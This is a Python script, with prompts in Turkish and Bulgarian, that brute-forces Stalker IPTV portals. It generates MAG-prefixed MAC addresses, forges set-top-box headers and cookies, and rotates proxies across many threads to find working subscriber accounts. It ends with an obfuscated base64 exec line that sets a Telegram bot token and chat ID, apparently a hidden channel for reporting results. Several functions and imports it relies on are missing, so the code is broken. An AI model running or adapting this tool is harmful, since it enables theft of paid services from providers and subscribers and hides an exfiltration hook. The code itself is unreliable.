#http://gotv.one/stalker_portal/c/
import urllib3
import os
def temizle():
    os.system('clear')
yeninesil=(
'00:1A:79:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
)
comboc=""
combototLen=""
combouz=0
combodosya=""
proxyc=""
proxytotLen=""
proxydosya=""
proxyuz=0

def dosyasec():
	global comboc,combototLen,proxyuz,proxydosya,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu
	say=0
	dsy=""
	
	if comboc=="":
		mesaj="Изберете combo..!\nИзберете файла с Mac Combo   "
		dir='/sdcard/IPTV/combo/'
		dsy="\n       \33[1;4;94;47m 0=⫸ Random (OTO MAC)  \33[0m\n"
	else:
		mesaj="Изберете combo прокси..!\nИзберете combo, където е прокси"
		dir='/sdcard/proxy/'
	if not os.path.exists(dir):
	    os.mkdir(dir)
	for files in os.listdir (dir):
	 	say=say+1
	 	dsy=dsy+str(say)+"=⫸ "+files+'\n'
	print ("""Combo Files,Select Number
Choose your combo from the list below!!

"""+dsy+"""
\33[33mВъв вашата combo папка """ +str(say)+""" намерен файл!
	""")
	dsyno=str(input("\33[31m"+mesaj+"\nCombo No = \33[0m"))
	say=0
	for files in os.listdir (dir):
		 say=say+1
		 if dsyno==str(say):
		 	dosya=(dir+files)
		 	break
	say=0
	try:
		 if not dosya=="":
		 	print(dosya)
		 else:
		 		temizle()
		 		print("Incorrect combo file selection..!")
		 		quit()
	except:
		if comboc=="":
			if dsyno=="0" or dsyno=="":
				temizle()
				nnesil=str(yeninesil)
				nnesil=(nnesil.count(',')+1)
				for xd in range(0,(nnesil)):
		 			tire='  》'
		 			if int(xd) <9:
		 				tire='   》'
		 			print(str(xd+1)+tire+yeninesil[xd])
				mactur=input("\nSelect mac type!\n\nAnswer = ")
				if mactur=="":
		 			mactur=1
				randomturu=input("""
Select mac combination type!

\33[33mFor cascading mac = \33[31m1
\33[33mFor random mac  = \33[31m2
		
\33[0m\33[1mMac type = \33[31m""")
				if randomturu=="":
		 			randomturu="2"
				serim=""
				serim=input("""\33[0m
\33[33mUse serial mac?\n
\33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write Number!! 
		
Answer = """)
				mactur=yeninesil[int(mactur)-1]
				if serim =="1":
		 			seri=input("Sample="+mactur+"\33[31m5\33[0m\nSample="+mactur+"\33[31mFa\33[32m\nWrite one or two values!!!\33[0m\n\33[1m"+mactur+"\33[31m")
				combouz=input("""\33[0m
		 		
Type the number of macs to scan?
		
Number of macs = """)
				if combouz=="":
		 			combouz=30000
				combouz=int(combouz)
				randommu="xdeep"
		else:
			temizle()
			print("Incorrect combo file selection...!")
			quit()
	if comboc=="":
		if randommu=="":
			combodosya=dosya
			comboc=open(dosya, 'r')
			combototLen=comboc.readlines()
			combouz=(len(combototLen))
		else:
			comboc='feyzo'
	else:
		#if not comboc=='feyzo':
			proxydosya=dosya
			proxyc=open(dosya, 'r')
			proxytotLen=proxyc.readlines()
			proxyuz=(len(proxytotLen))
			
randommu=""
dosyasec()

proxi=input("""
Искате ли да използвате прокси?

1 - Да
2 - Не

Изберете 1 or 2 = """)

#print(feyzo) 
if proxi =="1":
	dosyasec()
	pro=input("""
Какъв тип прокси е в избрания файл?
	
	1 - ipVanish
	2 - Socks4 
	3 - Socks5
	4 - Http/Https

Proxy type = """)
print(proxyuz)		
botgir=input("""
Колко Bots?

Bots = """)
if botgir=="":
	botgir=1

proxysay=0

import re
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


k=0
jj=0
iii=0
genmacs=""
bib=0
import random
def randommac():
	global genmacs,combosay
	combosay=combosay+1
	global k,jj,iii
	if randomturu == '2':
		while True:
			genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
			if not genmac in genmacs:
				genmacs=genmacs + ' '
				break
	else:
		if iii >= 257:
			iii=0
			jj=jj+1
		if jj >= 257:
			if not len(seri)==2:
				jj=0
			k=k+1
			if len(seri)==2:
				quit()
		if k==257:
			quit()
		genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
		iii=iii+1
	if serim=="1":
	   if len(seri) ==1:
	   	genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
	   if len(seri)==2:
	   	genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
	genmac=genmac.replace(':100',':10')
	genmac=genmac.upper()
	return genmac

import sys

def hea1(panel,mac):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
		}
		
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
			}

	return data
	
def hea2(mac,token):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
	}
	
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
			}
		
	return data

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

from datetime import date
def tarih_clear(trh):
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	d = date(int(yil), int(ay), int(gun))
	sontrh = time.mktime(d.timetuple())
	out=(int((sontrh-time.time())/86400))
	return out
	
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses=requests.Session()

combosay=0

combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti



def proxygetir():
	if proxi =="1":
		global proxysay,bib
		bib=bib+1
		bekle(bib,"xdeep")
		if bib==15:
			bib=0
		while True:
			try:
				proxysay=proxysay+1
				if proxysay==proxyuz:
					proxysay=0
				
				proxygeti=(proxytotLen[proxysay])
				pveri=proxygeti.replace('\n','')
				
				pip=pveri.split(':')[0]
				pport=pveri.split(':')[1]
				
				if pro=="1":
					pname=pveri.split(':')[2]
					ppass=pveri.split(':')[3]
					proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
				if pro=="2":
					proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
				if pro=="3":
					proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
				if pro=="4":
					proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
				break
			except:pass
	else:
		proxies=""
	return proxies


import threading
for xdeep in range(int(botgir)):
	XDeep = threading.Thread(target=XD)
	XDeep.start()
	
exec(base64.b64decode('VE9LRU4gPSAnNTY5MDI4NjY1NDpBQUdNdTNtTU4zRlBhLV9oODBITHZ3Q3pVbW51TVJBb1Q0cycKQ0hBVF9JRCA9ICctNTgyOTk3MTQwJw==')) 
